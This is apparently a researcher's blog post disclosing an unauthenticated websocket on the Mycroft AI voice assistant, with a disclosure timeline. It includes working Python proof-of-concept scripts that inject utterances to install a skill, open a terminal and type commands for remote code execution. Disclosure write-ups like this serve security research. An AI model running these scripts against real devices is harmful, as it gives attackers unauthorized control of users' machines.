# "Hey Mycroft, we've got a Problem"

Getting "Zero Click" Remote Code Execution in Mycroft AI vocal assistant

![Mycroft AI](https://dmtyylqvwgyxw.cloudfront.net/instances/132/uploads/images/custom_image/image/466/normal_9b94a225-8605-4d78-82d2-4c59f6981c57.jpg)

## Introduction

During my journey contributing to open source I was working with my friend [Matteo De Carlo](https://github.com/portaloffreedom) on an [AUR Package](https://git.covolunablu.org/portaloffreedom/plasma-mycroft-PKGBUILD) of a really interesting project called [Mycroft AI](https://mycroft.ai). It's an AI-powered vocal assistant started with a [crowdfunding campaign](https://www.kickstarter.com/projects/aiforeveryone/mycroft-an-open-source-artificial-intelligence-for) in 2015 and a [more recent one](https://www.indiegogo.com/projects/mycroft-mark-ii-the-open-voice-assistant#/) that allowed Mycroft to produce their Mark-I and Mark-II devices. It's also running on Linux Desktop/Server, Raspberry PI and will be available soon™ on [Jaguar Type-F](https://www.youtube.com/watch?v=6GHmzbXp_jY) and [Land Rover](https://mycroft.ai/blog/mycroft-welcomes-jaguar-land-rover-new-investor/)

## Digging in the source code

While looking at the [source code](https://github.com/MycroftAI/mycroft-core) I found an interesting point: [here](https://github.com/MycroftAI/mycroft-core/blob/1f4c98f29ceb6a7981474f1620441e43aa364d00/mycroft/messagebus/service/main.py#L28-L57)

```python
...
host = config.get("host")
port = config.get("port")
route = config.get("route")
validate_param(host, "websocket.host")
validate_param(port, "websocket.port")
validate_param(route, "websocket.route")

routes = [
        (route, WebsocketEventHandler)
]
application = web.Application(routes, **settings)
application.listen(port, host)
ioloop.IOLoop.instance().start()
...
```

it defines a websocket server that uses to get instructions from the remote clients (like the [Android one](https://github.com/MycroftAI/Mycroft-Android)). The settings for the websocket server are defined in [mycroft.conf](https://github.com/MycroftAI/mycroft-core/blob/aa594aebea99eebd0109ad013b71a2210f2b72f4/mycroft/configuration/mycroft.conf#L111-L117)

```json
// The mycroft-core messagebus' websocket
  "websocket": {
    "host": "0.0.0.0",
    "port": 8181,
    "route": "/core",
    "ssl": false
},
```

So there is a websocket server that doesn't require authentication that by default is exposed on `0.0.0.0:8181/core`. Let's test it 😉

```python
#!/usr/bin/env python

import asyncio
import websockets

uri = "ws://myserver:8181/core"
command = "say pwned"

async def sendPayload():
    async with websockets.connect(uri) as websocket:
        await websocket.send("{\"data\": {\"utterances\": [\""+command+"\"]}, \"type\": \"recognizer_loop:utterance\", \"context\": null}")

asyncio.get_event_loop().run_until_complete(sendPayload())
```

And magically we have an answer from the vocal assistant saying `pwned`!

Well, now we can have Mycroft pronounce stuff remotely, but this is not a really big finding unless you want to scare your friends, right?

![Trump WRONG](https://media1.tenor.com/images/8a4a99d3bd67ba8d9a025c36edf4a624/tenor.gif)

## The skills system

Digging deeper we can see that Mycroft has a skills system and a default skill that can install others skills (pretty neat, right?)

How is a skill composed? From what we can see from the documentation a default skill is composed by:

- `dialog/en-us/command.dialog` contains the vocal command that will trigger the skill
- `vocab/en-us/answer.voc` contains the answer that Mycroft will pronounce
- `requirements.txt` contains the requirements for the skill that will be installed with `pip`
- `__int__.py` contains the main function of the skill and will be loaded when the skill is triggered

## What can I do now?

I could create a malicious skill that when triggered runs arbitrary code on the remote machine, but unfortunately this is not possible via vocal command unless the URL of the skill is not whitelisted via the online website. So this is possible but will be a little tricky.

### So I'm done?

Not yet. I found out that I can trigger skills remotely and that is possible to execute commands on a remote machine convincing the user to install a malicious skill. I may have enough to submit a vulnerability report. But maybe I can do a bit better...

## Getting a remote shell using default skills

We know that Mycroft has some [default skills](https://github.com/MycroftAI/mycroft-skills) like `open` that will open an application and others that are whitelisted but not installed. Reading through to the list, I found a really interesting skill called `skill-autogui`, whose description says `Manipulate your mouse and keyboard with Mycroft`. **We got it!**

Let's try to combine everything we found so far into a PoC:

```python
#!/usr/bin/env python

import sys
import asyncio
import websockets
import time


cmds = ["mute audio"] + sys.argv[1:]
uri = "ws://myserver:8181/core"


async def sendPayload():
    for payload in cmds:
        async with websockets.connect(uri) as websocket:
            await websocket.send("{\"data\": {\"utterances\": [\""+payload+"\"]}, \"type\": \"recognizer_loop:utterance\", \"context\": null}")
            time.sleep(1)

asyncio.get_event_loop().run_until_complete(sendPayload())
```

Running the exploit with `python pwn.py "install autogui" "open xterm" "type echo pwned" "press enter"`  allowed me to finally get a command execution on a Linux machine.

![PoC](PoC.gif)

![WASSUUUUUUUUUUUUUUUUUUUUUUUUP](https://thumbs.gfycat.com/PleasedEducatedGalah-size_restricted.gif)

## _Notes_

- `open xterm` was needed because my test Linux environment had a DE installed, on a remote server the commands will be executed directly on TTY so this step is not nesessary.
- The skill branching had a [big change](https://mycroft.ai/blog/skill-branching-18-02/) and now some skills are not (yet) available (autogui is one of them) but this is not the real point. Mycroft has skills to interact with domotic houses and other services that can still be manipulated (the lack of imagination is the limit here). The vulnerability rediseds in the lack of authentication for the ws.

## Affected devices

All the devices running Mycroft <= ? with the websocket server exposed

## Interested in my work?

Follow me on:

- Twitter: `@0x7a657461`
- Linkedin: [https://linkedin.com/u/0xzeta](https://linkedin.com/u/0xzeta)
- GitHub: [https://github.com/Nhoya](https://github.com/Nhoya)

## Timeline

- 08/03/2018 Vulnerability found
- 09/03/2018 Vulnerability reported
- 13/03/2018 The CTO answered that they are aware of this problem and are currently working on a patch
- 06/06/2018 The CTO said that they have no problem with the realease of the vulnerability and will add a warning to remember the user to use a firewall `¯\_(ツ)_/¯`
- 09/06/2018 Public disclosure
